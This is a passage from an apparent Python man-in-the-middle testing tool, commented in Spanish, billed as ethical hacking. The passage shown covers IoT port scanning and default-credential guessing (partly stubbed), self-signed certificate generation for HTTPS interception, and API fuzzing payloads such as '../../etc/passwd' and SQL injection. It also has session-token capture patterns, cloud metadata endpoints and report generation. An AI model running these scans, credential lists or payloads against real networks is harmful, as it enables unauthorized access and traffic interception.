                results_file = os.path.join(self.output_dir, f"mitm_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
                save_json(results_file, results)
                logger.info(f"Resultados guardados en {results_file}")
            except Exception as e:
                logger.error(f"Error al guardar resultados: {str(e)}")
        
        logger.info("Ataque MITM detenido")
        
        return True
    
    def _scan_iot_protocols(self, network):
        '''
        Escanea la red en busca de dispositivos IoT que utilicen protocolos MQTT o CoAP
        
        Args:
            network (str): Red a escanear en formato CIDR (ej: 192.168.1.0/24)
        '''
        try:
            # Escaneo de puertos MQTT (1883, 8883)
            logger.info("Escaneando puertos MQTT (1883, 8883)...")
            mqtt_devices = []
            
            # Implementación básica con socket
            for host in self._get_hosts_from_network(network):
                for port in [1883, 8883]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((host, port))
                    if result == 0:
                        logger.info(f"Dispositivo MQTT encontrado: {host}:{port}")
                        mqtt_devices.append({'ip': host, 'port': port, 'protocol': 'MQTT'})
                    sock.close()
            
            # Escaneo de puertos CoAP (5683, 5684)
            logger.info("Escaneando puertos CoAP (5683, 5684)...")
            coap_devices = []
            
            for host in self._get_hosts_from_network(network):
                for port in [5683, 5684]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.5)
                    try:
                        sock.sendto(b'\x40\x01\x00\x00', (host, port))
                        data, addr = sock.recvfrom(1024)
                        if data:
                            logger.info(f"Dispositivo CoAP encontrado: {host}:{port}")
                            coap_devices.append({'ip': host, 'port': port, 'protocol': 'CoAP'})
                    except:
                        pass
                    sock.close()
            
            # Guardar resultados
            self.iot_devices = mqtt_devices + coap_devices
            
            # Si está habilitado el testing de credenciales por defecto
            if self.default_credential_testing and (mqtt_devices or coap_devices):
                self._test_default_credentials(mqtt_devices + coap_devices)
                
        except Exception as e:
            logger.error(f"Error al escanear protocolos IoT: {str(e)}")
    
    def _get_hosts_from_network(self, network):
        '''
        Obtiene una lista de hosts a partir de una red en formato CIDR
        
        Args:
            network (str): Red en formato CIDR (ej: 192.168.1.0/24)
            
        Returns:
            list: Lista de IPs de hosts
        '''
        try:
            return [str(ip) for ip in ipaddress.IPv4Network(network, strict=False).hosts()]
        except Exception as e:
            logger.error(f"Error al obtener hosts de la red: {str(e)}")
            return []
    
    def _test_default_credentials(self, devices):
        '''
        Prueba credenciales por defecto en dispositivos IoT
        
        Args:
            devices (list): Lista de dispositivos a probar
        '''
        logger.info("Probando credenciales por defecto en dispositivos IoT...")
        
        # Lista común de credenciales por defecto
        default_credentials = [
            {'user': 'admin', 'pass': 'admin'},
            {'user': 'admin', 'pass': 'password'},
            {'user': 'admin', 'pass': '1234'},
            {'user': 'admin', 'pass': '12345'},
            {'user': 'admin', 'pass': 'default'},
            {'user': 'root', 'pass': 'root'},
            {'user': 'user', 'pass': 'user'},
            {'user': 'guest', 'pass': 'guest'}
        ]
        
        # Resultados
        vulnerable_devices = []
        
        for device in devices:
            if device['protocol'] == 'MQTT':
                # Probar conexión MQTT con credenciales por defecto
                for cred in default_credentials:
                    # Aquí iría la implementación real con una biblioteca MQTT
                    # Por ahora solo simulamos
                    logger.info(f"Probando {device['ip']}:{device['port']} con {cred['user']}/{cred['pass']}")
                    # Si encontramos credenciales válidas
                    # vulnerable_devices.append({'device': device, 'credentials': cred})
        
        # Guardar resultados
        self.vulnerable_iot_devices = vulnerable_devices
    
    def _setup_https_inspection(self):
        '''
        Configura la inspección de tráfico HTTPS
        '''
        if not self.https_inspection:
            return False
            
        logger.info("Configurando inspección HTTPS...")
        
        # Generar certificado SSL autofirmado si no existe
        cert_dir = os.path.join(self.output_dir, 'certs')
        create_dir_if_not_exists(cert_dir)
        
        cert_file = os.path.join(cert_dir, 'mitm.pem')
        key_file = os.path.join(cert_dir, 'mitm.key')
        
        if not os.path.exists(cert_file) or not os.path.exists(key_file):
            logger.info("Generando certificado SSL autofirmado...")
            try:
                # Generar certificado con OpenSSL
                cmd = f"openssl req -new -x509 -days 365 -nodes -out {cert_file} -keyout {key_file} -subj '/CN=MITM Proxy/O=UnityDex/C=ES'"
                run_command(cmd)
                logger.info(f"Certificado generado en {cert_file}")
            except Exception as e:
                logger.error(f"Error al generar certificado: {str(e)}")
                return False
        
        return True
    
    def _setup_script_injection_detection(self):
        '''
        Configura la detección de inyección de scripts
        '''
        if not self.script_injection_detection:
            return False
            
        logger.info("Configurando detección de inyección de scripts...")
        
        # Patrones de inyección de scripts comunes
        self.script_injection_patterns = [
            re.compile(r'<script[^>]*>[\s\S]*?</script>', re.IGNORECASE),
            re.compile(r'javascript:', re.IGNORECASE),
            re.compile(r'on\w+=["\'][^"\'>]*["\']', re.IGNORECASE),
            re.compile(r'\balert\s*\(', re.IGNORECASE),
            re.compile(r'\bdocument\.cookie', re.IGNORECASE),
            re.compile(r'\blocation\.href', re.IGNORECASE)
        ]
        
        return True
    
    def _setup_api_fuzzing(self):
        '''
        Configura el fuzzing de APIs
        '''
        if not self.api_fuzzing:
            return False
            
        logger.info("Configurando fuzzing de APIs...")
        
        # Patrones para detectar endpoints de API
        self.api_patterns = [
            re.compile(r'/api/[\w/]+', re.IGNORECASE),
            re.compile(r'/v\d+/[\w/]+', re.IGNORECASE),
            re.compile(r'/rest/[\w/]+', re.IGNORECASE),
            re.compile(r'/graphql', re.IGNORECASE)
        ]
        
        # Payloads para fuzzing
        self.api_fuzzing_payloads = [
            "'",
            "\"\"'",
            "<script>alert(1)</script>",
            "1 OR 1=1",
            "../../etc/passwd",
            "{\"__proto__\":{}}"  # Prototype pollution
        ]
        
        return True
    
    def _setup_session_hijacking_detection(self):
        '''
        Configura la detección de secuestro de sesión
        '''
        if not self.session_hijacking_detection:
            return False
            
        logger.info("Configurando detección de secuestro de sesión...")
        
        # Patrones para detectar cookies de sesión
        self.session_cookie_patterns = [
            re.compile(r'session[\w_]*=([^;]+)', re.IGNORECASE),
            re.compile(r'auth[\w_]*=([^;]+)', re.IGNORECASE),
            re.compile(r'token[\w_]*=([^;]+)', re.IGNORECASE),
            re.compile(r'jwt[\w_]*=([^;]+)', re.IGNORECASE)
        ]
        
        # Diccionario para almacenar sesiones detectadas
        self.detected_sessions = {}
        
        return True
    
    def _setup_container_security_scan(self):
        '''
        Configura el escaneo de seguridad de contenedores
        '''
        if not self.container_security_scan:
            return False
            
        logger.info("Configurando escaneo de seguridad de contenedores...")
        
        # Puertos comunes de Docker y Kubernetes
        self.container_ports = [
            2375,  # Docker sin TLS
            2376,  # Docker con TLS
            10250,  # Kubelet
            8080,   # API sin autenticación
            6443    # Kubernetes API
        ]
        
        return True
    
    def _setup_cloud_misconfiguration_scan(self):
        '''
        Configura el escaneo de configuraciones incorrectas en la nube
        '''
        if not self.cloud_misconfiguration_scan:
            return False
            
        logger.info("Configurando escaneo de configuraciones incorrectas en la nube...")
        
        # Endpoints comunes de metadatos de instancias cloud
        self.cloud_metadata_endpoints = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/instance",  # Azure
        ]
        
        return True
    
    def _setup_vlan_hopping_test(self):
        '''
        Configura la prueba de VLAN hopping
        '''
        if not self.vlan_hopping_test:
            return False
            
        logger.info("Configurando prueba de VLAN hopping...")
        
        # Verificar si scapy está disponible
        if not SCAPY_AVAILABLE:
            logger.error("Scapy no está disponible. No se puede realizar la prueba de VLAN hopping.")
            return False
        
        return True
    
    def _generate_compliance_report(self, results, report_type):
        '''
        Genera un informe de cumplimiento según el estándar especificado
        
        Args:
            results (dict): Resultados del ataque
            report_type (str): Tipo de informe (OWASP, NIST, ISO27001)
            
        Returns:
            dict: Informe de cumplimiento
        '''
        if not report_type:
            return None
            
        logger.info(f"Generando informe de cumplimiento {report_type}...")
        
        compliance_report = {
            'type': report_type,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'findings': []
        }
        
        if report_type == 'OWASP':
            # OWASP Top 10
            categories = {
                'A1': 'Inyección',
                'A2': 'Pérdida de Autenticación',
                'A3': 'Exposición de Datos Sensibles',
                'A4': 'Entidades Externas XML (XXE)',
                'A5': 'Pérdida de Control de Acceso',
                'A6': 'Configuración de Seguridad Incorrecta',
                'A7': 'Cross-Site Scripting (XSS)',
                'A8': 'Deserialización Insegura',
                'A9': 'Uso de Componentes con Vulnerabilidades Conocidas',
                'A10': 'Registro y Monitoreo Insuficientes'
            }
            
            # Añadir hallazgos según las vulnerabilidades detectadas
            # Ejemplo: Si se detectó XSS
            if hasattr(self, 'detected_script_injections') and self.detected_script_injections:
                compliance_report['findings'].append({
                    'category': 'A7',
                    'name': categories['A7'],
                    'description': 'Se detectaron posibles vulnerabilidades XSS',
                    'evidence': self.detected_script_injections,
                    'severity': 'High'
                })
        
        elif report_type == 'NIST':
            # NIST Cybersecurity Framework
            categories = {
                'ID': 'Identificar',
                'PR': 'Proteger',
                'DE': 'Detectar',
                'RS': 'Responder',
                'RC': 'Recuperar'
            }
            
            # Ejemplo: Categoría Detectar
            compliance_report['findings'].append({
                'category': 'DE',
                'name': categories['DE'],
                'subcategory': 'DE.CM-7',
                'description': 'Monitoreo para detectar código malicioso',
                'evidence': 'Se realizó monitoreo de tráfico en busca de código malicioso',
                'status': 'Implemented'
            })
        
        elif report_type == 'ISO27001':
            # ISO 27001
            categories = {
                'A.5': 'Políticas de seguridad de la información',
                'A.6': 'Organización de la seguridad de la información',
                'A.7': 'Seguridad de los recursos humanos',
                'A.8': 'Gestión de activos',
                'A.9': 'Control de acceso',
                'A.10': 'Criptografía',
                'A.11': 'Seguridad física y ambiental',
                'A.12': 'Seguridad de las operaciones',
                'A.13': 'Seguridad de las comunicaciones',
                'A.14': 'Adquisición, desarrollo y mantenimiento de sistemas',
                'A.15': 'Relaciones con proveedores',
                'A.16': 'Gestión de incidentes de seguridad de la información',
                'A.17': 'Aspectos de seguridad de la información de la gestión de continuidad de negocio',
                'A.18': 'Cumplimiento'
            }
            
            # Ejemplo: Seguridad de las comunicaciones
            compliance_report['findings'].append({
                'category': 'A.13',
                'name': categories['A.13'],
                'control': 'A.13.1.1',
                'description': 'Controles de red',
                'evidence': 'Se analizaron controles de red mediante pruebas de penetración',
                'status': 'Compliant'
            })
        
        return compliance_report
    
    def _generate_attack_vector_visualization(self, results):
        '''
        Genera una visualización de vectores de ataque
        
        Args:
            results (dict): Resultados del ataque
            
        Returns:
            str: HTML con la visualización de vectores de ataque
        '''
        if not self.attack_vector_visualization:
            return None
            
        logger.info("Generando visualización de vectores de ataque...")
        
        # Generar HTML con visualización usando D3.js
        html = '''
        <div class="attack-vector-visualization">
            <h3>Visualización de Vectores de Ataque</h3>
            <div id="attack-vector-chart" style="width: 100%; height: 400px;"></div>
            <script src="https://d3js.org/d3.v7.min.js"></script>
            <script>
                // Datos de vectores de ataque
                const attackVectors = {
                    "nodes": [
                        {"id": "attacker", "name": "Atacante", "type": "attacker"},
                        {"id": "gateway", "name": "Gateway", "type": "network"},
        '''
        
        # Añadir nodos para dispositivos detectados
        if hasattr(self, 'detected_devices') and self.detected_devices:
            for i, device in enumerate(self.detected_devices):
                html += f'''
                        {{"id": "device{i}", "name": "{device.get('ip', 'Desconocido')}", "type": "device"}},'''  
        
        # Añadir nodos para vulnerabilidades
        vulnerabilities = []
        if self.ssl_strip:
            vulnerabilities.append({"id": "ssl_strip", "name": "SSL Strip", "type": "vulnerability"})
        if self.dns_spoof:
            vulnerabilities.append({"id": "dns_spoof", "name": "DNS Spoofing", "type": "vulnerability"})
        
        for vuln in vulnerabilities:
            html += f'''
                        {{"id": "{vuln['id']}", "name": "{vuln['name']}", "type": "{vuln['type']}"}},'''  
        
        # Eliminar la última coma
        html = html.rstrip(',')  
        
        html += '''
                    ],
                    "links": [
                        {"source": "attacker", "target": "gateway", "value": 1},
        '''
        
        # Añadir enlaces
        if hasattr(self, 'detected_devices') and self.detected_devices:
            for i, _ in enumerate(self.detected_devices):
                html += f'''
                        {{"source": "gateway", "target": "device{i}", "value": 1}},'''  
        
        # Añadir enlaces para vulnerabilidades
        for vuln in vulnerabilities:
            html += f'''
                        {{"source": "attacker", "target": "{vuln['id']}", "value": 1}},'''  
        
        # Eliminar la última coma
        html = html.rstrip(',')  
        
        html += '''
                    ]
                };
                
                // Configuración del gráfico
                const width = document.getElementById("attack-vector-chart").clientWidth;
                const height = 400;
                
                const svg = d3.select("#attack-vector-chart")
                    .append("svg")
                    .attr("width", width)
                    .attr("height", height);
                
                // Crear simulación de fuerzas
                const simulation = d3.forceSimulation(attackVectors.nodes)
                    .force("link", d3.forceLink(attackVectors.links).id(d => d.id).distance(100))
                    .force("charge", d3.forceManyBody().strength(-300))
                    .force("center", d3.forceCenter(width / 2, height / 2));
                
                // Definir colores según el tipo
                const color = d3.scaleOrdinal()
                    .domain(["attacker", "network", "device", "vulnerability"])
                    .range(["#e74c3c", "#3498db", "#2ecc71", "#f39c12"]);
                
                // Crear enlaces
                const link = svg.append("g")
                    .selectAll("line")
                    .data(attackVectors.links)
                    .enter().append("line")
                    .attr("stroke", "#999")
                    .attr("stroke-opacity", 0.6)
                    .attr("stroke-width", d => Math.sqrt(d.value));
                
                // Crear nodos
                const node = svg.append("g")
                    .selectAll("circle")
                    .data(attackVectors.nodes)
                    .enter().append("circle")
                    .attr("r", 10)
                    .attr("fill", d => color(d.type))
                    .call(d3.drag()
                        .on("start", dragstarted)
                        .on("drag", dragged)
                        .on("end", dragended));
                
                // Añadir etiquetas
                const label = svg.append("g")
                    .selectAll("text")
                    .data(attackVectors.nodes)
                    .enter().append("text")
                    .text(d => d.name)
                    .attr("font-size", 12)
                    .attr("dx", 15)
                    .attr("dy", 4);
                
                // Actualizar posiciones en cada tick
                simulation.on("tick", () => {
                    link
                        .attr("x1", d => d.source.x)
                        .attr("y1", d => d.source.y)
                        .attr("x2", d => d.target.x)
                        .attr("y2", d => d.target.y);
                    
                    node
                        .attr("cx", d => d.x)
                        .attr("cy", d => d.y);
                    
                    label
                        .attr("x", d => d.x)
                        .attr("y", d => d.y);
                });
                
                // Funciones para arrastrar nodos
                function dragstarted(event, d) {
                    if (!event.active) simulation.alphaTarget(0.3).restart();
                    d.fx = d.x;
                    d.fy = d.y;
                }
                
                function dragged(event, d) {
                    d.fx = event.x;
                    d.fy = event.y;
                }
                
                function dragended(event, d) {
                    if (!event.active) simulation.alphaTarget(0);
                    d.fx = null;
                    d.fy = null;
                }
            </script>
        </div>
        '''
        
        return html
    
    def _generate_auto_recommendations(self, results):
        '''
        Genera recomendaciones automáticas basadas en los resultados
        
        Args:
            results (dict): Resultados del ataque
            
        Returns:
            list: Lista de recomendaciones
        '''
        if not self.auto_recommendations:
            return None
            
        logger.info("Generando recomendaciones automáticas...")
        
        recommendations = []
        
        # Recomendaciones generales
        recommendations.append({
            'category': 'General',
            'title': 'Actualizar firmware y software',
            'description': 'Mantener actualizados todos los dispositivos de red, sistemas operativos y aplicaciones para mitigar vulnerabilidades conocidas.',
            'priority': 'Alta'
        })
        
        # Recomendaciones específicas según las vulnerabilidades detectadas
        if self.ssl_strip and results.get('ssl_strip'):
            recommendations.append({
                'category': 'SSL/TLS',
                'title': 'Implementar HSTS (HTTP Strict Transport Security)',
                'description': 'Configurar HSTS en todos los servidores web para forzar conexiones HTTPS y prevenir ataques de SSL Strip.',
                'priority': 'Alta'
            })
        
        if self.dns_spoof and results.get('dns_spoof'):
            recommendations.append({
                'category': 'DNS',
                'title': 'Implementar DNSSEC',
                'description': 'Configurar DNSSEC para verificar la autenticidad de los registros DNS y prevenir ataques de DNS Spoofing.',
                'priority': 'Alta'
            })
        
        # Recomendaciones para dispositivos IoT si se detectaron
        if hasattr(self, 'iot_devices') and self.iot_devices:
            recommendations.append({
                'category': 'IoT',
                'title': 'Segmentar dispositivos IoT',
                'description': 'Colocar los dispositivos IoT en una red separada (VLAN) para limitar el acceso a otros sistemas críticos.',
                'priority': 'Media'
            })
        
        # Recomendaciones para vulnerabilidades de contenedores
        if self.container_security_scan:
            recommendations.append({
                'category': 'Contenedores',
                'title': 'Implementar políticas de seguridad para contenedores',
                'description': 'Utilizar herramientas como Seccomp, AppArmor o SELinux para limitar los privilegios de los contenedores.',
                'priority': 'Media'
            })
        
        return recommendations
    
    def get_results(self):
        '''
        Obtiene los resultados del ataque
        
        Returns:
            dict: Diccionario con los resultados del ataque
        '''
        duration = 0
        if self.attack_start_time:
            if self.attack_end_time:
                duration = self.attack_end_time - self.attack_start_time
            else:
                duration = time.time() - self.attack_start_time
        
        results = {
            'interface': self.interface,
            'gateway_ip': self.gateway_ip,
            'target_ip': self.target_ip,
            'start_time': datetime.fromtimestamp(self.attack_start_time).strftime('%Y-%m-%d %H:%M:%S') if self.attack_start_time else None,
            'end_time': datetime.fromtimestamp(self.attack_end_time).strftime('%Y-%m-%d %H:%M:%S') if self.attack_end_time else None,
            'duration': duration,
            'ssl_strip': self.ssl_strip,
            'dns_spoof': self.dns_spoof,
            'credential_capture': self.credential_capture,
            'code_injection': self.code_injection,
            'os_type': self.os_type,
            'detected_devices': self.detected_devices if hasattr(self, 'detected_devices') else [],
            'captured_credentials_count': len(self.captured_credentials) if hasattr(self, 'captured_credentials') else 0,
            'dns_spoof_hosts': self.dns_spoof_hosts,
            'packet_capture': self.packet_capture,
            'capture_file': self.capture_file if self.packet_capture else None,
            
            # Nuevas funcionalidades de hacking ético
            'https_inspection': self.https_inspection,
            'script_injection_detection': self.script_injection_detection,
            'api_fuzzing': self.api_fuzzing,
            'session_hijacking_detection': self.session_hijacking_detection,
            'mqtt_coap_scan': self.mqtt_coap_scan,
            'default_credential_testing': self.default_credential_testing,
            'firmware_analysis': self.firmware_analysis,
            'container_security_scan': self.container_security_scan,
            'cloud_misconfiguration_scan': self.cloud_misconfiguration_scan,
            'vlan_hopping_test': self.vlan_hopping_test,
            'compliance_report_type': self.compliance_report_type,
            'attack_vector_visualization': self.attack_vector_visualization,
            'auto_recommendations': self.auto_recommendations
        }
        
        # Añadir resultados específicos de las nuevas funcionalidades
        if hasattr(self, 'iot_devices') and self.iot_devices:
            results['iot_devices'] = self.iot_devices
            
        if hasattr(self, 'vulnerable_iot_devices') and self.vulnerable_iot_devices:
            results['vulnerable_iot_devices'] = self.vulnerable_iot_devices
            
        if hasattr(self, 'detected_script_injections') and self.detected_script_injections:
            results['detected_script_injections'] = self.detected_script_injections
            
        if hasattr(self, 'detected_sessions') and self.detected_sessions:
            results['detected_sessions'] = self.detected_sessions
            
        # Generar informes adicionales si están habilitados
        if self.compliance_report_type:
            results['compliance_report'] = self._generate_compliance_report(results, self.compliance_report_type)
            
        if self.attack_vector_visualization:
            results['attack_vector_visualization_html'] = self._generate_attack_vector_visualization(results)
            
        if self.auto_recommendations:
            results['recommendations'] = self._generate_auto_recommendations(results)
        
        # Verificar si hay archivos de captura
        if self.capture_file and os.path.exists(self.capture_file):
            results['capture_file_size'] = os.path.getsize(self.capture_file)
        
        # Verificar si hay archivos de log de SSL Strip
        sslstrip_log = os.path.join(self.output_dir, 'sslstrip.log')
        if os.path.exists(sslstrip_log):
            results['sslstrip_log'] = sslstrip_log
            results['sslstrip_log_size'] = os.path.getsize(sslstrip_log)
        
        return results
    
    def save_results(self, output_file=None):
        '''
        Guarda los resultados del ataque en un archivo JSON
        '''
        if not output_file:
            # Generar nombre de archivo por defecto
            if not self.output_dir:
                self.output_dir = 'results'
            
            if not os.path.exists(self.output_dir):
                try:
                    os.makedirs(self.output_dir)
                except Exception as e:
                    logger.error(f"Error al crear directorio de salida: {str(e)}")
                    return False
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(self.output_dir, f"mitm_attack_{timestamp}.json")
        
        # Obtener resultados
        results = self.get_results()
        
        # Guardar resultados
        try:
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=4)
            
            logger.info(f"Resultados guardados en {output_file}")
            return True
        except Exception as e:
            logger.error(f"Error al guardar resultados: {str(e)}")
            return False
    
    def generate_report(self, output_file=None, format='txt'):
        '''
        Genera un informe del ataque
        '''
        if not output_file:
            # Generar nombre de archivo por defecto
            if not self.output_dir:
                self.output_dir = 'results'
            
            if not os.path.exists(self.output_dir):
                try:
                    os.makedirs(self.output_dir)
                except Exception as e:
                    logger.error(f"Error al crear directorio de salida: {str(e)}")
                    return False
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(self.output_dir, f"mitm_report_{timestamp}.{format}")
        
        # Obtener resultados
        results = self.get_results()
        
        try:
            if format.lower() == 'txt':
                with open(output_file, 'w') as f:
                    f.write("=== INFORME DE ATAQUE MITM ===\n\n")
                    f.write(f"Interfaz: {results['interface']}\n")
                    f.write(f"Gateway IP: {results['gateway_ip']}\n")
                    f.write(f"Target IP: {results['target_ip'] or 'Toda la red'}\n")
                    f.write(f"Inicio: {results['start_time']}\n")
                    f.write(f"Fin: {results['end_time']}\n")
                    f.write(f"Duración: {results['duration']:.2f} segundos\n\n")
                    
                    f.write("--- CONFIGURACIÓN ---\n")
                    f.write(f"SSL Strip: {'Habilitado' if results['ssl_strip'] else 'Deshabilitado'}\n")
                    f.write(f"DNS Spoof: {'Habilitado' if results['dns_spoof'] else 'Deshabilitado'}\n")
                    
                    if results['dns_spoof'] and results['dns_spoof_hosts']:
                        f.write("\nHosts DNS Spoof:\n")
                        for domain, ip in results['dns_spoof_hosts'].items():
                            f.write(f"  {domain} -> {ip}\n")
                    
                    f.write(f"\nCaptura de paquetes: {'Habilitado' if results['packet_capture'] else 'Deshabilitado'}\n")
                    
                    if results['packet_capture'] and results['capture_file']:
                        f.write(f"Archivo de captura: {results['capture_file']}\n")
                        
                        if 'capture_file_size' in results:
                            f.write(f"Tamaño de captura: {results['capture_file_size']} bytes\n")
                    
                    if 'sslstrip_log' in results:
                        f.write(f"\nLog de SSL Strip: {results['sslstrip_log']}\n")
                        
                        if 'sslstrip_log_size' in results:
                            f.write(f"Tamaño de log: {results['sslstrip_log_size']} bytes\n")
                    
                    f.write("\n=== FIN DEL INFORME ===\n")
            elif format.lower() == 'html':
                with open(output_file, 'w') as f:
                    f.write("<!DOCTYPE html>\n")
                    f.write("<html>\n")
                    f.write("<head>\n")
                    f.write("    <title>Informe de Ataque MITM</title>\n")
                    f.write("    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n")
                    f.write("    <style>\n")
                    f.write("        :root {\n")
                    f.write("            --primary-color: #2c3e50;\n")
                    f.write("            --secondary-color: #3498db;\n")
                    f.write("            --success-color: #2ecc71;\n")
                    f.write("            --danger-color: #e74c3c;\n")
                    f.write("            --warning-color: #f39c12;\n")
                    f.write("            --light-color: #ecf0f1;\n")
                    f.write("            --dark-color: #34495e;\n")
                    f.write("        }\n")
                    f.write("        * { box-sizing: border-box; }\n")
                    f.write("        body { \n")
                    f.write("            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; \n")
                    f.write("            margin: 0; \n")
                    f.write("            padding: 0; \n")
                    f.write("            background-color: #f5f7fa; \n")
                    f.write("            color: #333; \n")
                    f.write("            line-height: 1.6;\n")
                    f.write("        }\n")
                    f.write("        .container { \n")
                    f.write("            max-width: 1200px; \n")
                    f.write("            margin: 0 auto; \n")
                    f.write("            padding: 20px;\n")
                    f.write("        }\n")
                    f.write("        .header { \n")
                    f.write("            background: linear-gradient(135deg, var(--primary-color), var(--dark-color)); \n")
                    f.write("            color: white; \n")
                    f.write("            padding: 30px 20px; \n")
                    f.write("            border-radius: 8px; \n")
                    f.write("            margin-bottom: 30px; \n")
                    f.write("            box-shadow: 0 4px 6px rgba(0,0,0,0.1);\n")
                    f.write("        }\n")
                    f.write("        .header h1 { \n")
                    f.write("            margin: 0; \n")
                    f.write("            font-size: 28px;\n")
                    f.write("        }\n")
                    f.write("        .header p { \n")
                    f.write("            margin: 10px 0 0; \n")
                    f.write("            opacity: 0.8;\n")
                    f.write("        }\n")
                    f.write("        .section { \n")
                    f.write("            background: white; \n")
                    f.write("            border-radius: 8px; \n")
                    f.write("            padding: 20px; \n")
                    f.write("            margin-bottom: 30px; \n")
                    f.write("            box-shadow: 0 2px 4px rgba(0,0,0,0.05);\n")
                    f.write("        }\n")
                    f.write("        h2 { \n")
                    f.write("            color: var(--primary-color); \n")
                    f.write("            margin-top: 0; \n")
                    f.write("            padding-bottom: 10px; \n")
                    f.write("            border-bottom: 2px solid var(--light-color);\n")
                    f.write("        }\n")
                    f.write("        .info-grid { \n")
                    f.write("            display: grid; \n")
                    f.write("            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); \n")
                    f.write("            gap: 20px; \n")
                    f.write("            margin-bottom: 20px;\n")
                    f.write("        }\n")
                    f.write("        .info-card { \n")
                    f.write("            background: var(--light-color); \n")
                    f.write("            border-radius: 6px; \n")
                    f.write("            padding: 15px; \n")
                    f.write("            display: flex; \n")
                    f.write("            align-items: center;\n")
                    f.write("        }\n")
                    f.write("        .info-card .icon { \n")
                    f.write("            width: 40px; \n")
                    f.write("            height: 40px; \n")
                    f.write("            background: var(--secondary-color); \n")
                    f.write("            border-radius: 50%; \n")
                    f.write("            display: flex; \n")
                    f.write("            align-items: center; \n")
                    f.write("            justify-content: center; \n")
                    f.write("            margin-right: 15px; \n")
                    f.write("            color: white; \n")
                    f.write("            font-size: 18px;\n")
                    f.write("        }\n")
                    f.write("        .info-card .content { flex: 1; }\n")
                    f.write("        .info-card .label { \n")
                    f.write("            font-size: 14px; \n")
                    f.write("            color: #666; \n")
                    f.write("            margin-bottom: 5px;\n")
                    f.write("        }\n")
                    f.write("        .info-card .value { \n")
                    f.write("            font-size: 16px; \n")
                    f.write("            font-weight: 600;\n")
                    f.write("        }\n")
                    f.write("        .feature-cards { \n")
                    f.write("            display: grid; \n")
                    f.write("            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); \n")
                    f.write("            gap: 20px;\n")
                    f.write("        }\n")
                    f.write("        .feature-card { \n")
                    f.write("            border-radius: 8px; \n")
                    f.write("            padding: 20px; \n")
                    f.write("            display: flex; \n")
                    f.write("            flex-direction: column; \n")
                    f.write("            align-items: center; \n")
                    f.write("            text-align: center; \n")
                    f.write("            transition: transform 0.3s;\n")
                    f.write("        }\n")
                    f.write("        .feature-card:hover { transform: translateY(-5px); }\n")
                    f.write("        .feature-card.enabled { \n")
                    f.write("            background: linear-gradient(135deg, #e8f5e9, #c8e6c9); \n")
                    f.write("            border: 1px solid #a5d6a7;\n")
                    f.write("        }\n")
                    f.write("        .feature-card.disabled { \n")
                    f.write("            background: linear-gradient(135deg, #ffebee, #ffcdd2); \n")
                    f.write("            border: 1px solid #ef9a9a;\n")
                    f.write("        }\n")
                    f.write("        .feature-icon { \n")
                    f.write("            width: 60px; \n")
                    f.write("            height: 60px; \n")
                    f.write("            border-radius: 50%; \n")
                    f.write("            display: flex; \n")
                    f.write("            align-items: center; \n")
                    f.write("            justify-content: center; \n")
                    f.write("            margin-bottom: 15px;\n")
                    f.write("        }\n")
                    f.write("        .feature-card.enabled .feature-icon { \n")
                    f.write("            background-color: var(--success-color); \n")
                    f.write("            color: white;\n")
                    f.write("        }\n")
                    f.write("        .feature-card.disabled .feature-icon { \n")
                    f.write("            background-color: var(--danger-color); \n")
                    f.write("            color: white;\n")
                    f.write("        }\n")
                    f.write("        .feature-name { \n")
                    f.write("            font-size: 18px; \n")
                    f.write("            font-weight: 600; \n")
                    f.write("            margin-bottom: 10px;\n")
                    f.write("        }\n")
                    f.write("        .feature-status { \n")
                    f.write("            font-size: 14px; \n")
                    f.write("            font-weight: 500;\n")
                    f.write("        }\n")
                    f.write("        .feature-card.enabled .feature-status { color: var(--success-color); }\n")
                    f.write("        .feature-card.disabled .feature-status { color: var(--danger-color); }\n")
                    f.write("        table { \n")
                    f.write("            width: 100%; \n")
                    f.write("            border-collapse: collapse; \n")
                    f.write("            margin-top: 20px; \n")
                    f.write("            background: white; \n")
                    f.write("            border-radius: 8px; \n")
                    f.write("            overflow: hidden; \n")
                    f.write("            box-shadow: 0 2px 4px rgba(0,0,0,0.05);\n")
                    f.write("        }\n")
                    f.write("        th, td { \n")
                    f.write("            padding: 12px 15px; \n")
                    f.write("            text-align: left; \n")
                    f.write("            border-bottom: 1px solid #eee;\n")
                    f.write("        }\n")
                    f.write("        th { \n")
                    f.write("            background-color: var(--primary-color); \n")
                    f.write("            color: white; \n")
                    f.write("            font-weight: 500;\n")
                    f.write("        }\n")
                    f.write("        tr:last-child td { border-bottom: none; }\n")
                    f.write("        tr:nth-child(even) { background-color: #f9f9f9; }\n")
                    f.write("        .file-card { \n")
                    f.write("            background: white; \n")
                    f.write("            border-radius: 8px; \n")
                    f.write("            padding: 15px; \n")
                    f.write("            margin-bottom: 15px; \n")
                    f.write("            box-shadow: 0 2px 4px rgba(0,0,0,0.05); \n")
                    f.write("            display: flex; \n")
                    f.write("            align-items: center;\n")
                    f.write("        }\n")
                    f.write("        .file-icon { \n")
                    f.write("            width: 40px; \n")
                    f.write("            height: 40px; \n")
                    f.write("            background: var(--secondary-color); \n")
                    f.write("            border-radius: 8px; \n")
                    f.write("            display: flex; \n")
                    f.write("            align-items: center; \n")
                    f.write("            justify-content: center; \n")
                    f.write("            margin-right: 15px; \n")
                    f.write("            color: white; \n")
                    f.write("            font-size: 18px;\n")
                    f.write("        }\n")
                    f.write("        .file-details { flex: 1; }\n")
                    f.write("        .file-type { \n")
                    f.write("            font-size: 14px; \n")
                    f.write("            color: #666; \n")
                    f.write("            margin-bottom: 5px;\n")
                    f.write("        }\n")
                    f.write("        .file-path { \n")
                    f.write("            font-size: 16px; \n")
                    f.write("            font-weight: 500;\n")
                    f.write("        }\n")
